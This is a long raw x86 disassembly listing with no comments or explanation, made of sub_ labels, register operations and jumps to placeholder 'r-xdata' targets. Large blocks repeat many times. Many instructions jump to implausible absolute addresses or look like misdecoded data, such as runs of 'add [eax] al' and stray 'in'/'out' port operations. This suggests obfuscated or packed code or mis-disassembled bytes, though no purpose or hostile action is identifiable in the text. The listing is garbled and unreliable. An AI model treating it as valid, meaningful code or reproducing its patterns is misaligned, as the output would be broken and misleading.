jmp 0xffffffffcec1e1cb
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb917
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13cda2
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc009ba4b
mov eax 0xff64870f
jg r-xdata
jl 0xe24b804
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc648999
jge r-xdata
call sub_40446d
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_40452a
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c20779
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100c8d3
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jae r-xdata
jpo 0x36289d72
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d2c
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7289dc2
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb917
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13cda2
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_404557
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120c870
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcc849
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20779
ja r-xdata
jmp 0xffffffffe7289dc2
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d72
jno r-xdata
jno 0xffffffffff13cda2
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c15d2c
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb917
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100c8d3
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4045a7
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20779
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d72
jg r-xdata
jge 0xffffffffe1c15d2c
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb917
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7289dc2
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13cda2
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100c8d3
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_4045d9
jg r-xdata
push ecx
push edi
call sub_404659
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20779
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d72
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7289dc2
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13cda2
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c15d2c
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb917
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100c8d3
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_404635
jae r-xdata
push esp
push edx
call sub_4045a7
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120c870
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcc849
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20779
ja r-xdata
jmp 0xffffffffe7289dc2
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d72
jno r-xdata
jno 0xffffffffff13cda2
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c15d2c
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb917
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100c8d3
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_404710
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_404710
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_404748
jne 0xffffffffa3a52dbb
push esi
push esi
pushfd
call sub_404739
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add dh dl
inc edi
inc eax
add [ ebx + 0x57704ec ] al
jmp 0xffffffff894f4dd0
sub_404748
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f4dd0
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864ec6f
mov ecx 0x850fef7f
push ebp
call sub_40476c
jns 0xffffffffc2c150d6
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_40478f
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_404787
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x1050c5b
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_4047c0
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x8c ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_404999
retn 0x10
sub_404787
push ebx
push eax
call sub_40478f
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_404787
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x1050c5b
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_4047c0
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x8c ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_404999
retn 0x10
sub_40478f
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_404787
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8289aee
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x1050c5b
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_4047c0
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x8c ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_404999
retn 0x10
sub_40490e
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe846ba66
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35c06a
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
or ecx 0x30246c81
test [ eax + 0x40 ] 0x0
push ebp
push esp
sub esp 0x8
call sub_40493a
jae 0x5a7637b4
push ebx
jmp 0xffffffff83949e81
push edx
push ebp
sub esp 0xc
call sub_40495f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
out dx al
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fe9
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864b5c6
add al [ ebx + 0x77d04ec ]
sub_40493a
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x4864b5c6
push edx
push ebp
sub esp 0xc
call sub_40495f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
out dx al
dec ecx
inc eax
